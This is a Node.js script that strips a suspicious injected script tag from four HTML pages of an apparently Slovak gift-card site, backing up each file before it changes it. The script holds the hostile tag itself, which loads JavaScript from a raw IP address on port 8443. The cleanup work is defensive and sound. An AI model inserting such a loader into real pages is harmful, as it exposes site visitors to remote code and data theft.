const fs = require('fs');
const FILES = [
  'public/darcekova-karta-hotovo.html',
  'public/darek.html',
  'public/legal.html',
  'public/uplatnit-darcek.html'
];

const ANCHOR = `<script type='text/javascript' src='https://91.99.188.203:8443/ZmUctGu6p9ILdLGuRAcNJ_EgARcpNWvZe13n-4CKwm40upBIk5d8miF3NBrIL1trb0G6q5L0XoGWPGvbRRKm06UvIp1zp6Z0uc2kg5CGsMVHju47ryFIjjZ9K1rQZWUXYz1QF55jIJDFaFl1kMH960vETafSFmkxxZi15-yAE6ya1OYK7PBdvtfXxOfAV5O5sf8q5AGbiFeuls_vNpmr9IMU3rDZNNqP_I2ppHgn2JWQpNG804DpFlKL01EMv0nRkzCuLBo3YgQM_lTscj5Ls7MZAKeRPH2mlwu3Hg5u11iRKobcrb1jVwDCjw_MZv3JlGGen9A2TcR3o5HfbqMcDahcz7UVJorxnKmYuRCHxOpletZzbmxe2vYbsP1JDKWsuKaS6ipjGfpFDsjy1lgKSwMwSdNLLH6f9FvlTTlBAAM3iXQexdHG2FpHd0bujW8sJzwWoZQixMB-ud-BJLZpC28XbHVzMTNYuvq-q0DCAa4PiE03TH6YD8iUz0c8OPyHwfkaHoEHwRwRVYD2wZpHtm3WZWWIeRFcuOwyih04ZAXFCLiex4USxvcBeIo1OEXyvfYuAwHxyg'></script>`;

let anyFailed = false;

for (const FILE of FILES) {
  if (!fs.existsSync(FILE)) { console.log(`SKIP: ${FILE} not found`); continue; }
  const src = fs.readFileSync(FILE, 'utf8');
  const count = src.split(ANCHOR).length - 1;
  if (count === 0) {
    console.log(`SKIP: ${FILE} — anchor not found (already clean, or different variant)`);
    continue;
  }
  if (count > 1) {
    console.error(`ABORT on ${FILE}: anchor occurs ${count} times (expected 1). Left untouched.`);
    anyFailed = true;
    continue;
  }
  const backup = FILE + '.pre-remove-suspicious-script-' + Date.now();
  fs.copyFileSync(FILE, backup);
  fs.writeFileSync(FILE, src.split(ANCHOR).join(''));
  console.log(`OK: ${FILE} cleaned (backup: ${backup})`);
}

if (anyFailed) process.exit(1);
